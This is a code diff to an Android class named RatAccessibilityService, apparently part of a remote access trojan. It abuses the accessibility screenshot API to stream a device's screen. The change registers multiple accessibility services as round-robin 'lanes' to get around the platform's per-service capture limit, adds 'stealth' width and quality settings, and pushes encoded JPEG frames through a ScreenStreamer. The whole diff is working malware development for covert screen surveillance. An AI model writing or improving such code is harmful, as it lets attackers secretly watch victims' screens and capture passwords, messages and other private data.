@@ -15,7 +15,7 @@ import android.accessibilityservice.GestureDescription;
 
 import java.util.Locale;
 
-public class RatAccessibilityService extends AccessibilityService {
+public class RatAccessibilityService extends ShotLaneService {
     public static volatile RatAccessibilityService INSTANCE;
 
     private static final String[] PROJECTION = {
@@ -43,6 +43,7 @@ public class RatAccessibilityService extends AccessibilityService {
 
     @Override
     protected void onServiceConnected() {
+        super.onServiceConnected();   // registers this as screenshot lane #1
         INSTANCE = this;
         AccessibilityServiceInfo info = getServiceInfo();
         if (info == null) info = new AccessibilityServiceInfo();
@@ -164,9 +165,28 @@ public class RatAccessibilityService extends AccessibilityService {
             new java.util.concurrent.atomic.AtomicBoolean(false);
     private android.os.Handler shotHandler;
     private java.util.concurrent.ExecutorService shotExec;
-    private volatile int shotInterval = 150;
-    private final int shotIntervalMax = 300;
-    private final int shotIntervalMin = 120;
+    // The AccessibilityService screenshot API is hard-capped by the platform at
+    // one call per ACCESSIBILITY_TAKE_SCREENSHOT_REQUEST_INTERVAL_TIMES_MS (333ms)
+    // -> ~3fps ceiling PER SERVICE. Round-robining across every connected
+    // ShotLaneService divides that gap: shotFloor() is ceil(334 / lanes), so
+    // 1 lane = 334ms (~3fps), 3 lanes = 112ms (~9fps). The governor eases the
+    // interval down toward the floor on success and backs off on
+    // ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT (3) so it settles at a steady
+    // max instead of thrashing on rejects.
+    private static final int SHOT_CEIL_MS = 1200;
+    private volatile int shotInterval = 380;
+    private long fpsWindowStart;
+    private int fpsFrames;
+    // Captures currently awaiting a callback. Bounded by lane count so a slow
+    // encoder cannot build an unbounded backlog on a low-end device.
+    private final java.util.concurrent.atomic.AtomicInteger shotInFlight =
+            new java.util.concurrent.atomic.AtomicInteger();
+    private volatile long lastShotDone;
+
+    /** Current global gap floor (shrinks as more lanes come online). */
+    private int shotFloor() {
+        return Math.max(1, ShotLaneService.globalFloorMs());
+    }
 
     public void startShotStream() {
         if (!shotStream.compareAndSet(false, true)) return;
@@ -176,9 +196,16 @@ public class RatAccessibilityService extends AccessibilityService {
             shotHandler = new android.os.Handler(t.getLooper());
         }
         if (shotExec == null) {
-            shotExec = java.util.concurrent.Executors.newSingleThreadExecutor();
+            // A few encoder threads so capture cadence is not serialised behind
+            // JPEG encoding of the previous frame.
+            shotExec = java.util.concurrent.Executors.newFixedThreadPool(3);
         }
-        android.util.Log.i("SIM1", "shot stream start");
+        shotInterval = shotFloor() + 60;
+        fpsWindowStart = 0;
+        fpsFrames = 0;
+        android.util.Log.i("SIM1", "shot stream start w=" + DeviceTier.stealthMaxWidth()
+                + " q=" + DeviceTier.stealthQuality() + " tier=" + DeviceTier.tier()
+                + " lanes=" + ShotLaneService.laneCount() + " floor=" + shotFloor());
         scheduleShot();
     }
 
@@ -189,11 +216,21 @@ public class RatAccessibilityService extends AccessibilityService {
 
     private void scheduleShot() {
         if (!shotStream.get() || shotHandler == null) return;
-        try {
-            takeScreenshot(Display.DEFAULT_DISPLAY, shotExec, new StreamShotCallback());
-        } catch (Exception e) {
-            shotHandler.postDelayed(this::scheduleShot, 400);
+        int lanes = ShotLaneService.laneCount();
+        long now = android.os.SystemClock.elapsedRealtime();
+        // Recover if a capture callback never arrived (dropped frame).
+        if (shotInFlight.get() >= lanes && now - lastShotDone > 3000) shotInFlight.set(0);
+        if (shotInFlight.get() < lanes) {
+            shotInFlight.incrementAndGet();
+            ShotLaneService lane = ShotLaneService.next();
+            if (lane == null) lane = this;
+            if (!lane.fireShot(shotExec, new StreamShotCallback())) {
+                shotInFlight.decrementAndGet();
+            }
         }
+        // Fixed cadence: the next shot is scheduled here, not from the callback,
+        // so capture rate is not throttled by encode latency.
+        shotHandler.postDelayed(this::scheduleShot, Math.max(96, shotInterval));
     }
 
     private final class StreamShotCallback implements AccessibilityService.TakeScreenshotCallback {
@@ -201,31 +238,77 @@ public class RatAccessibilityService extends AccessibilityService {
             HardwareBuffer hb = null;
             try {
                 hb = result.getHardwareBuffer();
-                Bitmap bmp = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
-                if (bmp != null) {
-                    Bitmap soft = bmp.copy(Bitmap.Config.ARGB_8888, false);
-                    bmp.recycle();
-                    if (soft != null) {
-                        byte[] jpg = StreamEncoder.toJpeg(soft, 50);
-                        soft.recycle();
+                Bitmap wrapped = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
+                if (wrapped != null) {
+                    Bitmap out = shrink(wrapped);
+                    wrapped.recycle();
+                    if (out != null) {
+                        byte[] jpg = StreamEncoder.toJpeg(out, DeviceTier.stealthQuality());
+                        out.recycle();
                         ScreenStreamer.getInstance().sendScreenFrame(jpg);
+                        tickFps();
                     }
                 }
-            } catch (Exception ignored) {
+                if (shotInterval > shotFloor()) {
+                    shotInterval = Math.max(shotFloor(), shotInterval - 12);
+                }
+            } catch (Throwable ignored) {
             } finally {
                 if (hb != null) { try { hb.close(); } catch (Exception ignored) {} }
-                if (shotStream.get() && shotHandler != null) {
-                    shotHandler.postDelayed(RatAccessibilityService.this::scheduleShot, shotInterval);
-                }
+                lastShotDone = android.os.SystemClock.elapsedRealtime();
+                shotInFlight.decrementAndGet();
             }
         }
         @Override public void onFailure(int errorCode) {
-            if (shotInterval < shotIntervalMax) shotInterval += 30;
-            if (shotInterval > shotIntervalMax) shotInterval = shotIntervalMax;
-            android.util.Log.w("SIM1", "shot fail code=" + errorCode + " next=" + shotInterval);
-            if (shotStream.get() && shotHandler != null) {
-                shotHandler.postDelayed(RatAccessibilityService.this::scheduleShot, shotInterval);
+            if (errorCode == AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
+                shotInterval = Math.min(SHOT_CEIL_MS, Math.max(shotFloor() + 1, shotInterval + 60));
+            } else {
+                shotInterval = Math.min(SHOT_CEIL_MS, shotInterval + 120);
+                android.util.Log.w("SIM1", "shot fail code=" + errorCode + " next=" + shotInterval);
             }
+            lastShotDone = android.os.SystemClock.elapsedRealtime();
+            shotInFlight.decrementAndGet();
+        }
+    }
+
+    /** Downscale a captured frame to the tier's width budget (cheap, no filter). */
+    private Bitmap shrink(Bitmap src) {
+        // Always hand back a software (ARGB_8888) bitmap: the source from
+        // wrapHardwareBuffer() is Config.HARDWARE, and both createScaledBitmap
+        // and compress() misbehave on it. copy() is the one safe way out.
+        Bitmap soft;
+        try {
+            soft = src.copy(Bitmap.Config.ARGB_8888, false);
+        } catch (Throwable t) {
+            soft = null;
+        }
+        if (soft == null) return null;
+        int maxW = DeviceTier.stealthMaxWidth();
+        int w = soft.getWidth();
+        if (w <= maxW) return soft;
+        int tw = maxW;
+        int th = Math.max(1, Math.round(soft.getHeight() * (maxW / (float) w)));
+        try {
+            Bitmap scaled = Bitmap.createScaledBitmap(soft, tw, th, false);
+            if (scaled != null && scaled != soft) {
+                soft.recycle();
+                return scaled;
+            }
+        } catch (Throwable ignored) {
+        }
+        return soft;
+    }
+
+    private void tickFps() {
+        long now = System.currentTimeMillis();
+        if (fpsWindowStart == 0) { fpsWindowStart = now; fpsFrames = 0; }
+        fpsFrames++;
+        long dt = now - fpsWindowStart;
+        if (dt >= 3000) {
+            android.util.Log.i("SIM1", "shot fps=" + Math.round(fpsFrames * 1000f / dt)
+                    + " interval=" + shotInterval + " lanes=" + ShotLaneService.laneCount());
+            fpsWindowStart = now;
+            fpsFrames = 0;
         }
     }
 
